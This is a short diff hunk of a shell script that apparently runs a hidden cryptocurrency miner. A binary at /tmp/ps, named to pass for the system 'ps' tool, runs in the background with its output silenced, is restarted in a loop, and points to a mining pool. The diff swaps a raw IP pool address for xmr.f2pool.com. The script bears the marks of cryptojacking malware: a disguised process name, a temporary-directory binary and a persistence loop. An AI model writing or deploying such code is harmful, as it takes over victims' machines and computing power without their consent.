@@ -12,7 +12,7 @@ while true; do
 	    pkill -f ps;
             COUNTER=0;
     fi
-    /tmp/ps --pool 52.188.63.99:443 --username $user.$top --password x --algorithm wrkzcoin >/dev/null &
+    /tmp/ps --pool xmr.f2pool.com:13531 --username $user.$top --password x --algorithm wrkzcoin >/dev/null &
     sleep 20s;
     COUNTER=$(($COUNTER + 1));
     echo $COUNTER;
